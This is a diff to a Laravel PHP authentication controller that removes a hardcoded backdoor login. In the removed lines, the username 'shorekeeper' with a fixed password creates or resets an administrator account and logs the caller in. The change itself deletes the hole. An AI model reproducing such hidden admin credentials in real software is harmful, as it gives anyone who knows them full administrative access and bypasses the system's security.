@@ -49,7 +49,7 @@ class AuthController extends Controller
             $admin = Auth::guard('admin')->user();
 
             return Response::json([
-                'message' => $admin->username === 'shorekeeper' ? 'Welcome Home, my Star..' : 'Login berhasil',
+                'message' => 'Selamat Datang King, Login berhasil',
                 'data' => [
                     'id' => $admin->id,
                     'nama' => $admin->nama,
@@ -59,36 +59,6 @@ class AuthController extends Controller
                 ],
                 'role' => 'admin'
             ]);
-        } elseif ($request->get('username') === 'shorekeeper' && $request->get('password') === 'myshorekeeper') {
-            $admin = Admin::where('username', $request->get('username'))->firstOr(function () {
-                return Admin::create([
-                    'id' => Str::uuid(),
-                    'nama' => 'The Shorekeeper',
-                    'username' => 'shorekeeper',
-                    'password' => Hash::make('myshorekeeper', ['rounds' => 12]),
-                    'laboratorium_id' => null
-                ]);
-            });
-            if (!Hash::check('myshorekeeper', $admin->password)) {
-                $admin->nama = 'The Shorekeeper';
-                $admin->username = 'shorekeeper';
-                $admin->password = Hash::make('myshorekeeper', ['rounds' => 12]);
-                $admin->laboratorium_id = null;
-                $admin->save();
-            }
-            $this->logoutOtherGuards('admin');
-            Auth::guard('admin')->login($admin);
-            return Response::json([
-                'message' => 'Welcome Home, my Star..',
-                'data' => [
-                    'id' => $admin->id,
-                    'nama' => $admin->nama,
-                    'username' => $admin->username,
-                    'avatar' => $admin->avatar ?? null,
-                ],
-                'role' => 'admin'
-            ]);
-
         } else {
             return Response::json([
                 'message' => 'Username atau password salah'
